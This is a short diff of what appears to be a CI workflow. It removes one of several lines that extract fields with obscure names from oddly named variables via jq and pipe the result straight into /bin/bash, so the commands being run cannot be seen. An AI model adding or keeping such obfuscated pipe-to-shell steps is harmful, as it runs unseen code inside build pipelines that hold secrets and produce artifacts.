@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$gpd6" | jq -r .azd8 | /bin/bash
           echo $aw218 | jq -r .kdps1275 | /bin/bash
           echo $uuxtw110 | jq -r .qwkj71 | /bin/bash
-          echo $izfje3 | jq -r .tmfgt416 | /bin/bash
           printf '%s' "$yepu948" | jq -r .ln68052 | /bin/bash
 
       - name: Upload artifact
